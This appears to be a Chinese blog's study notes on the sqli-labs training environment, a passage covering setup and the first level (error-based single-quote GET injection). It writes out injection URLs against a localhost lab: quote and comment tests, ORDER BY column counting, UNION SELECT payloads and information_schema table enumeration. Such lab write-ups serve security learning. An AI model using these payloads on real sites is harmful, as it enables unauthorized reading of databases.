---
 title: Sqlilabs通关笔记(1-10)
 date: 2020-01-02 15:28:58
 tags:
 categories:
---


## 环境搭建

## 用于SQL注入学习环境

1. [源码下载地址](https://github.com/himadriganguly/sqlilabs)
2. 用phpstudy或者web环境直接搭建运行


## 第一关 基于错误的GET单引号字符型注入
![2020-1-2-17-52-39](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-2-17-52-39)

<!--more-->
- **存在注入判断**

    1. 加上单引号报错
    ```
    http://localhost/sqlilabs/practice/example1.php?id=1'
    ```
    2. 加上注释符页面正常
    ```
    http://localhost/sqlilabs/practice/example1.php?id=1' %23
    ```
    * 注释方式
        - \# 号注释
        - %23 注释 
        - --+ 注释
    3. 判断字段数(使用order by)
    ```
    http://localhost/sqlilabs/practice/example1.php?id=1'  order by 3%23 # 正常
    http://localhost/sqlilabs/practice/example1.php?id=1'  order by 4%23 # 页面显示错误

    说明字段数为3
    ```
    4. 执行注入Payload
    ```
    # 判断显示的信息点，通过id=-1来执行联合查询
    http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,2,3%23
    ```
    ![2020-1-2-17-53-4](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-2-17-53-4)
    
    * 常用查询信息
        - database() # 在用的数据库名
        - user()    # 用户信息
        - version() # 数据库版本信息
        - @@basedir # 数据库安装路径
    
    ![2020-1-2-17-43-36](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-2-17-43-36)


    5. 查看数据库数据

    * 查看表名称
    **group_concat函数:将查询到的多行结果连接成字符串**
    ```
    http://localhost/sqlilabs/practice/example1.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
    ```
